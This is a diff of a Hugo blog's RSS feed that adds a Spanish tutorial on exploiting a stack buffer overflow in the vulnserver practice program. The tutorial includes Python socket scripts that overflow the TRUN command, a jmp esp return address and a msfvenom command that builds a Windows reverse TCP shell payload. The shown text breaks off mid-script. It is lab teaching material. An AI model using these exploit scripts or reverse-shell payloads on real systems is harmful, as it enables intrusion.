@@ -2,17 +2,392 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>pacodiazdg.github.io</title>
-    <link>https://PacodiazDG.github.io/</link>
+    <link>http://10.10.8.69:1313/</link>
     <description>Recent content on pacodiazdg.github.io</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>es-es</language>
-    <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="https://PacodiazDG.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <language>en</language>
+    <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="http://10.10.8.69:1313/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>contador ascendente y descendente  con Display de 7 Segmentos para PIC18F4550 en Ensamblador</title>
-      <link>https://PacodiazDG.github.io/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</link>
+      <title> Que es un buffer overflow (vulnserver) (CFT)</title>
+      <link>http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>https://PacodiazDG.github.io/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</guid>
+      <guid>http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft/</guid>
+      <description>En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.
+Los dos programas que se van a ocupar son:</description>
+      <content>&lt;p&gt;En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.&lt;/p&gt;
+&lt;p&gt;Los dos programas que se van a ocupar son:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;x64dbg&lt;/li&gt;
+&lt;li&gt;IDA&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/stephenbradshaw/vulnserver&#34;&gt;https://github.com/stephenbradshaw/vulnserver&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;que-es-un-bufferoverflow&#34;&gt;Que es un bufferoverflow?&lt;/h3&gt;
+&lt;p&gt;bufferoverflow se produce cuando se colocan más datos en un búfer de longitud fija de los que el búfer puede manejar.
+en este caso en la función buffer tiene una variable de tamaño 5 y nuestra cadena tiene una longitud mayora a eso por lo que los datos restantes van a sobre escribir el stack&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;buffer&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; input) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;strcpy&lt;/span&gt;(buffer, input);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; argv) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; Vulnerable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;buffer&lt;/span&gt;(Vulnerable);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;enter image description here&#34; src=&#34;https://i.imgur.com/d7syZFV.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;si compilamos y depuramos vemos que el EIP (puntero de instrucción) no tiene una dirección si no puras &amp;ldquo;aaaa&amp;rdquo; en hax&lt;/p&gt;
+&lt;h3 id=&#34;encontrar-la-funcion-vulnerable&#34;&gt;Encontrar la funcion vulnerable&lt;/h3&gt;
+&lt;p&gt;para explotar el buffer overflow en vulnserver sin protecciones es bastante fácil&lt;/p&gt;
+&lt;p&gt;en este caso remiendo hacer un análisis estático del programa esto es más fácil si se hace desde IDA, el modo grafico nos va a ser de gran ayuda en estos casos para darle seguiento a las funciones&lt;/p&gt;
+&lt;p&gt;esta es la función de bienvenida por lo que hay que continuar para ver si hay algún comando vulnerable&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;enter image description here&#34; src=&#34;https://i.imgur.com/6pw7YUX.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;en este caso la funcion3 es candidata para ser explotada y es llamada por varios comandos, pero más especialmente por TRUN ya es la más fácil&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401808                 push    ebp
+.text:00401809                 mov     ebp, esp
+.text:0040180B                 sub     esp, 7E8h
+.text:00401811                 mov     eax, [ebp+arg_0]
+.text:00401814                 mov     [esp+7E8h+Source], eax ; Source
+.text:00401818                 lea     eax, [ebp+var_7D8]
+.text:0040181E                 mov     [esp+7E8h+Destination], eax ; Destination
+.text:00401821                 call    _strcpy
+.text:00401826                 leave
+.text:00401827                 retn
+.text:00401827 _Function3      endp
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;esta funcion es vulnerable ya que _strcpy no tiene ninguna &amp;ldquo;proteccion&amp;rdquo;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;code&gt;strcpy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Copia la cadena C señalada por la fuente en la matriz señalada por el destino , incluido el carácter nulo de terminación (y deteniéndose en ese punto).&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;En este caso para probar si es vulnerable vamos intentar enviar cadena de más de 2020 caracteres&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.1.115&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	remote_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gethostbyname( host )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gaierror:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((remote_ip , port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;command&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TRUN _.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2500&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exploit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;command&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;message
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; :
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(exploit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reply &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (reply)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo que buscamos es que se sobrescriba el ESP y después el EIP y como era de esperarse si se sobre escribió el EIP contiene 616161&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;enter image description here&#34; src=&#34;https://i.imgur.com/TkhMSIZ.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;explotacion-cantidad-de-bytes-necesarios&#34;&gt;Explotacion (cantidad de bytes necesarios)&lt;/h3&gt;
+&lt;p&gt;vamos a contar la cantidad bytes que se necesitan para llegar a esp y no sobrescribirlo en este caso recomiendo poner números aleatorios&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4kBsKSF.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;lo vamos a ejecutar para obtener la cantidad de bytes necesarios para sobrescribir el EIP&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4kIbqVz.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;invertimos el orden (Endianness)&lt;/p&gt;
+&lt;p&gt;30 54 68 37 == 37 68 54 30 == 7hT0&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/3HGhosz.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;buscamos en el texto y obtenemos que se ocupan 2005 bytes para evitar sobrescribir el EIP&lt;/p&gt;
+&lt;h3 id=&#34;explotacion-jmp-esp&#34;&gt;Explotacion (jmp esp)&lt;/h3&gt;
+&lt;p&gt;vamos a buscar alguna instrucción que nos pueda ayudar a ejecutar el contenido en ESP como por ejemplo jmp esp&lt;/p&gt;
+&lt;p&gt;search in &amp;ndash;&amp;gt; all modules &amp;ndash;&amp;gt; find command&lt;/p&gt;
+&lt;p&gt;buscamos  jmp esp&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/AfCAzDz.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Address=625011AF
+Disassembly=jmp esp&lt;/p&gt;
+&lt;p&gt;esto lo mandamos a EIP lo invetimos (Endianness)&lt;/p&gt;
+&lt;p&gt;por lo que nuestro código queda de la siguiente forma&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.1.115&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	remote_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gethostbyname( host )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gaierror:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((remote_ip , port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;command&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TRUN _.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;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&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;epi&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x62\x50\x11\xAF&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exploit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;command&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;message&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;epi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; :
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(exploit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reply &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (reply)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;explotacion-shellcode-calc-y-bad-characters&#34;&gt;Explotacion (Shellcode calc) y Bad Characters&lt;/h3&gt;
+&lt;p&gt;pueden usar exploitdb para buscar una shellcode calc o usar msfvenom en mi caso voy a usar exploitdb, una cosa que hay que tener en cuenta son los &amp;ldquo;Bad Characters&amp;rdquo; como mencione la función strcpy busca bytes nulos para terminar por lo que si nuestra sellcode tiene algun \x00 no va a completar la shellcode y no va a funcionar uno de los métodos mas usados en msvenom es -b &lt;code&gt;msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.109 LPORT=4444  -f c     -b &#39;\x00&#39;&lt;/code&gt; donde estoy borrando bytes nulos.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/48116&#34;&gt;https://www.exploit-db.com/exploits/48116&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
